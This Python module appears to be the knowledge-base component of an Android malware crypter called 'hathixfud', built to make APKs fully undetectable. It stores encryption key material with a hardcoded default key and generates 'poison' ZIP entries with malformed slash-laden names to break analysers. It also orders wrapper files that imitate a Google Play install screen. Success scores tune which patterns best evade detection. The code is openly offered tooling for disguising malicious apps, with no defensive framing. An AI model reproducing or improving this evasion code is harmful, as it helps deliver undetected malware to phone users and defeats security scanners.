#!/usr/bin/env python3
"""kb_manager.py — Knowledge Base manager for FUD pattern learning.

Stores and retrieves patterns extracted from APKs to improve FUD generation.
Patterns are scored by effectiveness and selected via weighted random.
"""
import json
import logging
import os
import random
import time
from pathlib import Path

logger = logging.getLogger("hathixfud-kb")

# Default patterns (used when KB is empty)
DEFAULT_IKM = bytes.fromhex("4d1b6cf23c68203a73509d9df1fc84698954feb71714ee5e61fe10ccc8a42d56")
DEFAULT_SALT_SIZE = 16
DEFAULT_NONCE_SIZE = 12
DEFAULT_COMPRESSION = 9
DEFAULT_POISON_COUNT = 90

# KB file for backup/export
KB_BACKUP_FILE = Path(__file__).parent / "kb_backup.json"


class KBManager:
    def __init__(self, db):
        self.db = db

    def add_pattern(self, category: str, pattern_type: str, data: dict,
                    source_apk: str = "", effectiveness: float = 50) -> int:
        """Add a pattern to the KB. Returns the pattern ID."""
        pattern_data = json.dumps(data, ensure_ascii=False)
        pid = self.db.add_kb_pattern(source_apk, category, pattern_type,
                                     pattern_data, effectiveness)
        logger.info("KB: added pattern %d [%s/%s] from %s", pid, category, pattern_type, source_apk)
        return pid

    def get_best(self, category: str, pattern_type: str) -> dict | None:
        """Get the highest-scored pattern."""
        row = self.db.get_kb_best_pattern(category, pattern_type)
        if row:
            return {"id": row["id"], "data": json.loads(row["pattern_data"]),
                    "score": row["effectiveness"]}
        return None

    def get_random(self, category: str, pattern_type: str) -> dict | None:
        """Get a weighted random pattern (higher score = more likely)."""
        row = self.db.get_kb_weighted_random(category, pattern_type)
        if row:
            return {"id": row["id"], "data": json.loads(row["pattern_data"]),
                    "score": row["effectiveness"]}
        return None

    def get_all(self, category: str, pattern_type: str) -> list:
        """Get all patterns for a category/type."""
        rows = self.db.get_kb_patterns(category, pattern_type)
        return [{"id": r["id"], "data": json.loads(r["pattern_data"]),
                 "score": r["effectiveness"], "uses": r["use_count"]} for r in rows]

    def update_score(self, pattern_id: int, success: bool):
        """Update pattern score: +10 for success, -5 for failure."""
        self.db.update_kb_score(pattern_id, success)

    def update_batch_score(self, pattern_ids: list, success: bool):
        """Update scores for multiple patterns."""
        for pid in pattern_ids:
            self.update_score(pid, success)

    def get_stats(self) -> dict:
        """Get KB statistics."""
        return self.db.get_kb_stats()

    def clear(self):
        """Clear all KB patterns."""
        self.db.clear_kb()
        logger.info("KB: cleared all patterns")

    def export_backup(self):
        """Export KB to JSON backup file."""
        stats = self.get_stats()
        backup = {"stats": stats, "patterns": {}}
        for cat in ("encryption", "poison", "wrapper"):
            backup["patterns"][cat] = {}
            for ptype in self._get_types_for_category(cat):
                patterns = self.get_all(cat, ptype)
                backup["patterns"][cat][ptype] = patterns
        KB_BACKUP_FILE.write_text(json.dumps(backup, indent=2, ensure_ascii=False))
        logger.info("KB: exported backup to %s", KB_BACKUP_FILE)
        return str(KB_BACKUP_FILE)

    def _get_types_for_category(self, category: str) -> list:
        """Get known pattern types for a category."""
        types = {
            "encryption": ["ikm", "salt_size", "nonce_size", "compression", "kind"],
            "poison": ["entry_name", "entry_size", "entry_count", "compression_flag"],
            "wrapper": ["ordering", "compress_map", "version_offset"],
        }
        return types.get(category, [])


def generate_ikm() -> bytes:
    """Generate a random IKM (Input Keying Material) for encryption."""
    return os.urandom(32)


def generate_poison_entries(count: int = 90, known_names: list = None) -> list:
    """Generate poison entry names and sizes.

    Uses KB patterns if available, otherwise generates based on known patterns.
    """
    if known_names and len(known_names) >= count:
        return random.sample(known_names, count)

    prefixes = ["kotlin", "META-INF", "resources.arsc", "AndroidManifest.xml",
                "classes.dex", "res", "assets", "lib"]
    suffixes = [".xml", ".png", ".9.png", ".dex", ".cfg", ".idx", ""]
    separators = ["/", "//", "///", "////"]

    entries = []
    for _ in range(count):
        prefix = random.choice(prefixes)
        sep = random.choice(separators)
        suffix = random.choice(suffixes)
        depth = random.randint(1, 3)
        parts = [prefix] + ["".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(1, 15))) for _ in range(depth)]
        name = sep.join(parts) + suffix
        size = random.randint(40, 100)
        entries.append([name, size])
    return entries


def generate_wrapper_ordering(known_orders: list = None) -> list:
    """Generate wrapper file ordering.

    Uses KB patterns if available, otherwise uses a shuffled default.
    """
    base_order = [
        "resources.arsc", "AndroidManifest.xml", "classes.dex",
        "res/color/btn_more_text_color.xml", "res/color/btn_text_color.xml",
        "res/layout/activity_store.xml", "res/drawable/btn_more.xml",
        "res/drawable/install_card.xml", "res/drawable/app_icon.png",
        "res/drawable/btn_install.xml", "res/drawable/gp_logo.xml",
        "res/drawable/rating_bar.xml", "res/drawable/icon_frame.xml",
        "res/drawable/progress_bar.xml", "assets/c7421fe9.cfg",
        "assets/nvcgehin", "assets/a1327cbd.idx", "assets/aee7a3cb.idx",
        "assets/a1f203ec.cfg", "assets/c40d3154.idx"
    ]

    if known_orders:
        return random.choice(known_orders)

    # Keep critical files first, shuffle the rest
    critical = base_order[:3]  # resources.arsc, AndroidManifest.xml, classes.dex
    rest = base_order[3:]
    random.shuffle(rest)
    return critical + rest
